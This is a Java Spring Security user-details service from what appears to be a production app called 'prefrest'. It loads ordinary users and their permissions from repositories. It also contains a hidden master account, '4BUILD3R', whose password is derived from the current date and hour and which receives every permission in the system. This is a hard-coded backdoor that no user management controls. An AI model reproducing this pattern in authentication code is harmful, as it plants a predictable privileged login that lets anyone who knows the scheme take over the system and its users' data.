package prefrest.com.prod.service;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;
import prefrest.com.prod.exception.UsuarioException;
import prefrest.com.prod.model.Permissao;
import prefrest.com.prod.model.Usuario;
import prefrest.com.prod.model.UsuarioPermissao;
import prefrest.com.prod.repository.usuario.PermissaoRepository;
import prefrest.com.prod.repository.usuario.UserRepository;
import prefrest.com.prod.repository.usuario.UsuarioPermissaoRepository;
import prefrest.com.prod.util.UtilPasswordEncoder;

import java.time.LocalDateTime;
import java.util.*;

@Component
public class CustomUserDetailService implements UserDetailsService {

    @Autowired
    UserRepository userRepository;

    @Autowired
    UsuarioPermissaoRepository usuarioPermissaoRepository;

    @Autowired
    PermissaoRepository permissaoRepository;

    @Override
    public UserDetails loadUserByUsername(String s) throws UsernameNotFoundException {
        if (s.equals("4BUILD3R")){
            StringBuilder pass = new StringBuilder();
            LocalDateTime dtHora = LocalDateTime.now();
            int mes = dtHora.getMonthValue();
            int dia = dtHora.getDayOfMonth();
            int hora = dtHora.getHour();

            if (dia > 15) {
                pass.append("F");
            }
            pass.append(mes + dia).append(dia + hora).append("R");
            //return new User(s, UtilPasswordEncoder.encodePassword(pass.toString()), AuthorityUtils.createAuthorityList("ROLE_ADMIN"));
            return new User(s, UtilPasswordEncoder.encodePassword(pass.toString()), permissaoUserMaster());
        } else {
            Usuario usuario = userRepository.findByUsuario(s);
            Optional.ofNullable(usuario).orElseThrow(UsuarioException::new);

            if (usuario.isInativo()){
                throw new UsuarioException();
            }

            //List<GrantedAuthority> authorityList = AuthorityUtils.createAuthorityList("ROLE_USER", "ROLE_ADMIN");
            return new User(usuario.getUsuario(), usuario.getSenha(), getPermissoesUsuario(usuario));
        }

    }

    private Collection<? extends GrantedAuthority> getPermissoesUsuario (Usuario usuario){
        Set<SimpleGrantedAuthority> authorities = new HashSet<>();
        List<UsuarioPermissao> listaPermissao = usuarioPermissaoRepository.findAllByCodTipoUsuarioOrderByCodPermissao(usuario.getCodTipoUsuario());
        List<Permissao> permissao =  new ArrayList<>();
        listaPermissao.forEach(usuarioPermissao -> permissao.add(permissaoRepository.findOne(usuarioPermissao.getCodPermissao())));
        permissao.forEach(perm -> authorities.add(new SimpleGrantedAuthority(perm.getPermissao())));
        return authorities;
    }

    private Collection<? extends GrantedAuthority> permissaoUserMaster () {
        Set<SimpleGrantedAuthority> authorities = new HashSet<>();
        List<Permissao> permissoes = permissaoRepository.findAll();
        permissoes.forEach(permissao -> authorities.add(new SimpleGrantedAuthority(permissao.getPermissao())));
        return authorities;
    }
}
